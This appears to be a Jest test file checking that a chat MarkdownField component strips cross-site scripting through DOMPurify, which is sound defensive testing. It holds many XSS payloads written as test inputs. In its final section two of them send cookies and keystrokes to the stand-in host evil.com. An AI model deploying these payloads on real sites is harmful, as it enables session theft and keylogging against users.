import { render } from "@testing-library/react";
import DOMPurify from "dompurify";
import { MarkdownField } from "../edit-message";

// Mock rehype and remark plugins
jest.mock("rehype-mathjax/browser", () => ({}));
jest.mock("rehype-raw", () => ({}));
jest.mock("remark-gfm", () => ({}));

// Mock dependencies
jest.mock("react-i18next", () => ({
  useTranslation: () => ({
    t: (key: string) => key,
  }),
}));

jest.mock("@/utils/codeBlockUtils", () => ({
  extractLanguage: jest.fn(),
  isCodeBlock: jest.fn(() => false),
}));

jest.mock("@/utils/markdownUtils", () => ({
  preprocessChatMessage: (text: string) => text,
}));

jest.mock("@/utils/utils", () => ({
  cn: (...args: string[]) => args.filter(Boolean).join(" "),
}));

jest.mock("@/components/core/codeTabsComponent", () => ({
  __esModule: true,
  default: () => <div>CodeTabsComponent</div>,
}));

describe("MarkdownField XSS Protection", () => {
  const defaultProps = {
    chat: {},
    isEmpty: false,
    chatMessage: "",
    editedFlag: null,
    isAudioMessage: false,
  };

  describe("Script Tag Injection", () => {
    it("should sanitize basic script tags", () => {
      const maliciousMessage = '<script>alert("XSS")</script>Hello';

      const { container } = render(
        <MarkdownField {...defaultProps} chatMessage={maliciousMessage} />,
      );

      expect(container.innerHTML).not.toContain("<script>");
      expect(container.innerHTML).not.toContain("alert(");
    });

    it("should sanitize script tags with various casings", () => {
      const testCases = [
        '<SCRIPT>alert("XSS")</SCRIPT>',
        '<ScRiPt>alert("XSS")</ScRiPt>',
        '<script>alert("XSS")</script>',
      ];

      testCases.forEach((maliciousMessage) => {
        const { container } = render(
          <MarkdownField {...defaultProps} chatMessage={maliciousMessage} />,
        );
        expect(container.innerHTML).not.toContain("alert");
      });
    });
  });

  describe("Event Handler Injection", () => {
    it("should remove onclick handlers", () => {
      const maliciousMessage =
        "<button onclick=\"alert('clicked')\">Click</button>";

      const { container } = render(
        <MarkdownField {...defaultProps} chatMessage={maliciousMessage} />,
      );

      expect(container.innerHTML).not.toContain("onclick");
      expect(container.innerHTML).not.toContain("alert");
    });

    it("should remove onerror handlers from images", () => {
      const maliciousMessage = "<img src=x onerror=\"alert('XSS')\">";

      const { container } = render(
        <MarkdownField {...defaultProps} chatMessage={maliciousMessage} />,
      );

      expect(container.innerHTML).not.toContain("onerror");
    });

    it("should remove onload handlers", () => {
      const maliciousMessage = "<body onload=\"alert('XSS')\">";

      const { container } = render(
        <MarkdownField {...defaultProps} chatMessage={maliciousMessage} />,
      );

      expect(container.innerHTML).not.toContain("onload");
      expect(container.innerHTML).not.toContain("alert");
    });

    it("should remove onmouseover handlers", () => {
      const maliciousMessage = "<div onmouseover=\"alert('XSS')\">Hover</div>";

      const { container } = render(
        <MarkdownField {...defaultProps} chatMessage={maliciousMessage} />,
      );

      expect(container.innerHTML).not.toContain("onmouseover");
    });
  });

  describe("Iframe Injection", () => {
    it("should sanitize iframe with srcdoc containing scripts", () => {
      const maliciousMessage =
        '<iframe srcdoc="<script>alert(document.cookie)</script>"></iframe>';

      const { container } = render(
        <MarkdownField {...defaultProps} chatMessage={maliciousMessage} />,
      );

      expect(container.innerHTML).not.toContain("document.cookie");
      expect(container.innerHTML).not.toContain("alert");
    });

    it("should sanitize iframe with javascript: protocol", () => {
      const maliciousMessage =
        "<iframe src=\"javascript:alert('XSS')\"></iframe>";

      const { container } = render(
        <MarkdownField {...defaultProps} chatMessage={maliciousMessage} />,
      );

      expect(container.innerHTML).not.toContain("javascript:");
      expect(container.innerHTML).not.toContain("alert");
    });
  });

  describe("SVG-based XSS", () => {
    it("should remove onload from SVG elements", () => {
      const maliciousMessage = "<svg onload=\"alert('XSS')\"></svg>";

      const { container } = render(
        <MarkdownField {...defaultProps} chatMessage={maliciousMessage} />,
      );

      expect(container.innerHTML).not.toContain("onload");
      expect(container.innerHTML).not.toContain("alert");
    });

    it("should sanitize SVG with embedded scripts", () => {
      const maliciousMessage = '<svg><script>alert("XSS")</script></svg>';

      const { container } = render(
        <MarkdownField {...defaultProps} chatMessage={maliciousMessage} />,
      );

      expect(container.innerHTML).not.toContain("alert");
    });
  });

  describe("Link-based XSS", () => {
    it("should remove javascript: protocol from links", () => {
      const maliciousMessage = "<a href=\"javascript:alert('XSS')\">Click</a>";

      const { container } = render(
        <MarkdownField {...defaultProps} chatMessage={maliciousMessage} />,
      );

      expect(container.innerHTML).not.toContain("javascript:");
    });

    it("should remove data: protocol with base64 encoded scripts", () => {
      const maliciousMessage =
        "<a href=\"data:text/html,<script>alert('XSS')</script>\">Click</a>";

      const { container } = render(
        <MarkdownField {...defaultProps} chatMessage={maliciousMessage} />,
      );

      expect(container.innerHTML).not.toContain("data:text/html");
    });
  });

  describe("DOMPurify Integration", () => {
    it("should use DOMPurify to sanitize content", () => {
      const sanitizeSpy = jest.spyOn(DOMPurify, "sanitize");
      const message = '<script>alert("XSS")</script>Test';

      render(<MarkdownField {...defaultProps} chatMessage={message} />);

      expect(sanitizeSpy).toHaveBeenCalled();
      sanitizeSpy.mockRestore();
    });

    it("should sanitize before rendering", () => {
      const maliciousMessage = '<script>alert("XSS")</script>Content';
      const sanitized = DOMPurify.sanitize(maliciousMessage);

      expect(sanitized).not.toContain("<script>");
      expect(sanitized).not.toContain("alert");
      expect(sanitized).toContain("Content");
    });
  });

  describe("Edge Cases", () => {
    it("should handle empty messages", () => {
      const { container } = render(
        <MarkdownField {...defaultProps} chatMessage="" isEmpty={true} />,
      );

      expect(container).toBeInTheDocument();
      expect(container.innerHTML).not.toContain("<script>");
    });

    it("should handle messages with only whitespace", () => {
      const { container } = render(
        <MarkdownField {...defaultProps} chatMessage="   " />,
      );

      expect(container).toBeInTheDocument();
    });

    it("should handle very long malicious payloads", () => {
      const longPayload = '<script>alert("XSS")</script>'.repeat(100);

      const { container } = render(
        <MarkdownField {...defaultProps} chatMessage={longPayload} />,
      );

      expect(container.innerHTML).not.toContain("alert");
    });

    it("should handle nested malicious tags", () => {
      const nestedPayload =
        '<div><span><script>alert("XSS")</script></span></div>';

      const { container } = render(
        <MarkdownField {...defaultProps} chatMessage={nestedPayload} />,
      );

      expect(container.innerHTML).not.toContain("alert");
    });
  });

  describe("Real-world Attack Vectors", () => {
    it("should block session cookie theft attempt", () => {
      const cookieTheft =
        "<iframe srcdoc=\"<script>fetch('https://evil.com?c='+document.cookie)</script>\"></iframe>";

      const { container } = render(
        <MarkdownField {...defaultProps} chatMessage={cookieTheft} />,
      );

      expect(container.innerHTML).not.toContain("document.cookie");
      expect(container.innerHTML).not.toContain("evil.com");
    });

    it("should block DOM manipulation attempts", () => {
      const domManipulation =
        "<img src=x onerror=\"document.body.innerHTML='<h1>Hacked</h1>'\">";

      const { container } = render(
        <MarkdownField {...defaultProps} chatMessage={domManipulation} />,
      );

      expect(container.innerHTML).not.toContain("document.body");
      expect(container.innerHTML).not.toContain("Hacked");
    });

    it("should block keylogger injection", () => {
      const keylogger =
        '<script>document.addEventListener("keypress",e=>fetch("https://evil.com?k="+e.key))</script>';

      const { container } = render(
        <MarkdownField {...defaultProps} chatMessage={keylogger} />,
      );

      expect(container.innerHTML).not.toContain("keypress");
      expect(container.innerHTML).not.toContain("addEventListener");
    });
  });
});
